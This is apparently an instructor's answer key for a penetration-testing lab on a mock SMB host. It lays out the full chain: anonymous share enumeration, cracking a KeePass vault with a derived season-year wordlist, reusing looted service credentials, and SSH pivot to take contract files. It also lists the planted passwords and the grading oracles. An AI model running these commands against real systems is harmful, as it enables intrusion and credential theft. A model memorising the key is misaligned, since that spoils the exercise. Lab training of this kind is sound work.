# Solution — 06 Northwind SMB (medium)

> Spoilers — instructor's answer key.

## Chain

1. **Null-session SMB enumeration.** `map to guest = Bad User` + a `guest ok` share means no
   creds are needed:
   ```sh
   smbclient -N -L //127.0.0.1 -p 8106
   smbclient -N //127.0.0.1/public -p 8106     # get -r *
   ```
   The `public` share holds `IT/passwords.kdbx`, `IT/backup.sh`, `HR/onboarding-notes.txt`,
   `Finance/README.txt`.
2. **Derive the vault password (non-obvious).** `passwords.kdbx` is a KeePass DB. Its master
   is **not in rockyou**. `HR/onboarding-notes.txt` states the convention: `Season + Year + "!"`
   and mentions the spring intake used `Spring2024!`. Build a tiny wordlist
   ({Spring,Summer,Autumn,Fall,Winter}{2023..2025}!) and crack:
   ```sh
   keepass2john passwords.kdbx > kdbx.hash
   john --wordlist=seasons.txt kdbx.hash      # -> Autumn2024!
   ```
3. **Loot the vault → reused creds.** The `pivot-backup` entry gives `svc-backup / b7-KZ2p-Wq9x`.
   `backup.sh` confirms this account rsyncs to `10.13.6.20`.
4. **Pivot & exfiltrate.** `ssh svc-backup@127.0.0.1 -p 8206` → `~/contracts/` holds
   `2026-Q3-customer-contracts.csv` (Meridian Freight Ltd, Halcyon Capital Partners, …).

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `vault-naming-hint` | "Season + Year + !" convention | SMB `HR/onboarding-notes.txt` |
| `keepass-vault` | `passwords.kdbx` (master `Autumn2024!`) | SMB `IT/` |
| `customer-contracts` | `Meridian Freight Ltd`, … | pivot `~svc-backup/contracts/` |

Vault entries: `svc-backup / b7-KZ2p-Wq9x` (pivot SSH), `guest / Cafe-Latte-9` (wifi).

## Reset

`make lab-restore LAB=06-medium-northwind-smb` (recreate — both hosts rebuild from the
baked-in share + seed).
